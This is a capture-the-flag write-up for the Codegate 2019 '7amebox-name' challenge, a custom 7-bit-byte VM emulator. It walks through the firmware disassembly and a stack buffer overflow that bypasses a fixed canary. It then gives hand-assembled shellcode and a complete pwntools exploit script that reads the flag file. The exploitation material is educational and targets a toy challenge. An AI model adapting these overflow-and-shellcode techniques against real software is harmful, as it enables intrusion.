+++
title = "Codegate CTF 2019 Quals - 7amebox-name"
date = "2024-07-25"
description = "Codegate CTF 2019 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "vm", "bof", "rop"]
+++

## 0x00. Introduction
``` bash
➜  ls -al
total 60
drwxr-xr-x  2 user user  4096 Jul 30 08:49 .
drwxr-x--- 25 user user  4096 Jul 30 08:49 ..
-rw-r--r--  1 user user   533 Jul 17 03:05 Dockerfile
-rwxr-xr-x  1 user user 30804 Jul 17 03:05 _7amebox_patched.py
-rw-r--r--  1 user user    41 Jul 17 03:05 flag
-rw-r--r--  1 user user   216 Jul 17 03:05 mic_check.firm
-rw-r--r--  1 user user    21 Jul 17 03:05 run.sh
-rwxr-xr-x  1 user user   299 Jul 17 03:05 vm_name.py
```

The structure is that when `vm_name.py` is executed via `run.sh`, it runs `mic_check.firm` with the emulator implemented in `_7amebox_patched.py`.

``` python
def read_memory_tri(self, addr, count):
    ...
        for i in range(count):
            tri = 0
            tri |= self.memory[addr + i*3]
            tri |= self.memory[addr + i*3 + 1]  << 14
            tri |= self.memory[addr + i*3 + 2]  << 7
            res.append(tri)
    ...

def write_memory_tri(self,addr,data_list, count):
    ...
        for i in range(count):
            self.memory[addr + i*3] =       (data_list[i] & 0b000000000000001111111)
            self.memory[addr + i*3 + 1] =   (data_list[i] & 0b111111100000000000000) >> 14
            self.memory[addr + i*3 + 2] =   (data_list[i] & 0b000000011111110000000) >> 7
    ...
```

We need to find a vulnerability in the firmware and exploit it in an emulator where one byte is **7 bits** and one word is **3 bytes**.


## 0x01. Vulnerability
```
main:
     0x9:  19 30           push bp
     0xb:  11 3c           mov bp, sp
     0xd:  2f 40 3c 00 00  sub sp, 0x3c
    0x12:  10 5b           mov r5, bp
    0x14:  2e 50 03 00 00  sub r5, 0x3
    0x19:  12 60 45 04 46  mov r6, 0x12345
    0x1e:  08 65           str r6, [r5] ; [r5] = r6
    0x20:  12 00 4d 00 01  mov r0, 0xcd         ; "name>"
    0x25:  7b 50 66 00 00  call pc + 0x66       ; write
    0x2a:  12 10 42 00 00  mov r1, 0x42
    0x2f:  10 5b           mov r5, bp
    0x31:  2e 50 3c 00 00  sub r5, 0x3c
    0x36:  10 05           mov r0, r5
    0x38:  7b 50 23 00 00  call pc + 0x23       ; read
    0x3d:  12 00 53 00 01  mov r0, 0xd3
    0x42:  7b 50 49 00 00  call pc + 0x49       ; strlen
    0x47:  10 5b           mov r5, bp
    0x49:  2e 50 03 00 00  sub r5, 0x3
    0x4e:  00 65           ldr r6, [r5] ; r6 = [r5]
    0x50:  5e 60 45 04 46  cmp r6, 0x12345
    0x55:  73 50 2b 7f 7f  je pc + 0x1fffab ; jne if A == B ; not FLAG_ZF       ; stack_chk_fail
    0x5a:  11 4b           mov sp, bp
    0x5c:  1d 30           pop bp
    0x5e:  1d 50           pop pc
```

As the firmware name `mic_check` suggests, the vulnerability is simple.
BOF occurs because 0x42 bytes are read at position `bp-0x3c`.

However, we need to be careful to write the canary value 0x12345 above the SFP.


## 0x02. Exploit
Since NX is disabled, I wrote the payload by constructing shellcode on the stack.

``` python
    payload = b"\x54\x00"                   # xor r0, r0
    payload += b"\x44\x00"                  # inc r0
    payload += b"\x10\x1c"                  # mov r1, sp
    payload += b"\x2e\x10\x0e\x00\x00"      # sub r1, 0xe
    payload += b"\x20\x00"                  # syscall   ; open("flag") ; r0 = 2
    payload += b"\x44\x00"                  # inc r0
    payload += b"\x12\x10\x02\x00\x00"      # mov r1, 2
    payload += b"\x12\x20\x00\x3d\x3e"      # mov r2, 0xf5f00
    payload += b"\x12\x30\x28\x00\x00"      # mov r3, 40
    payload += b"\x20\x00"                  # syscall   ; read(2, buf, 40)
    payload += b"\x12\x00\x02\x00\x00"      # mov r0, 2
    payload += b"\x54\x11"                  # xor r1, r1
    payload += b"\x44\x10"                  # inc r1
    payload += b"\x12\x30\x28\x00\x00"      # mov r3, 40
    payload += b"\x20\x00"                  # syscall   ; write(1, buf, 40)
    payload += b"\x00\x00\x00\x00"
    payload += b"flag\x00"                  # "flag"
    payload += p21(0x12345)                 # canary
    payload += p21(0x0)                     # sfp
    payload += p21(0xf5f9e)                 # ret
```

The `buf` size was tighter than expected, so I had to care about optimization.


## 0x03. Payload
``` python
from pwn import *
from gameboxlib import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = False
BINARY = "7amebox-name"
LIBRARY = ""

gs = f'''
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen(f"sudo docker top {BINARY} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        if DEBUG:
            gdb.attach(s, gs)

    s.recvuntil(b">")
    
    payload = b"\x54\x00"                   # xor r0, r0
    payload += b"\x44\x00"                  # inc r0
    payload += b"\x10\x1c"                  # mov r1, sp
    payload += b"\x2e\x10\x0e\x00\x00"      # sub r1, 0xe
    payload += b"\x20\x00"                  # syscall   ; open("flag") ; r0 = 2
    payload += b"\x44\x00"                  # inc r0
    payload += b"\x12\x10\x02\x00\x00"      # mov r1, 2
    payload += b"\x12\x20\x00\x3d\x3e"      # mov r2, 0xf5f00
    payload += b"\x12\x30\x28\x00\x00"      # mov r3, 40
    payload += b"\x20\x00"                  # syscall   ; read(2, buf, 40)
    payload += b"\x12\x00\x02\x00\x00"      # mov r0, 2
    payload += b"\x54\x11"                  # xor r1, r1
    payload += b"\x44\x10"                  # inc r1
    payload += b"\x12\x30\x28\x00\x00"      # mov r3, 40
    payload += b"\x20\x00"                  # syscall   ; write(1, buf, 40)
    payload += b"\x00\x00\x00\x00"
    payload += b"flag\x00"                  # "flag"
    payload += p21(0x12345)  # canary
    payload += p21(0x0)      # sfp
    payload += p21(0xf5f9e)  # ret

    s.sendline(payload)
    
    print(s.recvuntil(b'}'))

if __name__=='__main__':
    main()
```